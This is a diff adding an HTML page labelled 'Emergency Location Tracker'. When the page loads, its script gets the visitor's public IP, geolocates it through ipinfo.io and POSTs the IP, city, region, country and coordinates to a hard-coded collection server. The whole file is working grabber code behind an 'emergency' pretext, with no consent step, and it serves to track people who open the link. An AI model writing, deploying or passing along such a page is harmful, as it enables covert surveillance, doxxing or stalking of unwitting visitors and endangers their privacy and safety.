@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Tracker</title>
+</head>
+<body>
+    <h1>Emergency Location Tracker</h1>
+    <p>Please wait while we fetch your location...</p>
+    <script>
+        // Fetch public IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+
+                // Fetch geolocation based on IP
+                fetch(`https://ipinfo.io/${ip}/json`)
+                    .then(response => response.json())
+                    .then(locationData => {
+                        const locationInfo = {
+                            ip: ip,
+                            city: locationData.city || "N/A",
+                            region: locationData.region || "N/A",
+                            country: locationData.country || "N/A",
+                            coordinates: locationData.loc || "0,0"
+                        };
+
+                        // Send data to your server
+                        fetch('http://192.168.1.85:5000', { // Replace with your server URL
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(locationInfo)
+                        })
+                        .then(() => {
+                            document.body.innerHTML = '<h1>Location Sent Successfully!</h1>';
+                        })
+                        .catch(err => {
+                            console.error('Error sending data:', err);
+                            document.body.innerHTML = '<h1>Error sending location data.</h1>';
+                        });
+                    })
+                    .catch(err => {
+                        console.error('Error fetching location:', err);
+                        document.body.innerHTML = '<h1>Error fetching location data.</h1>';
+                    });
+            })
+            .catch(err => {
+                console.error('Error fetching IP:', err);
+                document.body.innerHTML = '<h1>Error fetching IP address.</h1>';
+            });
+    </script>
+</body>
+</html>
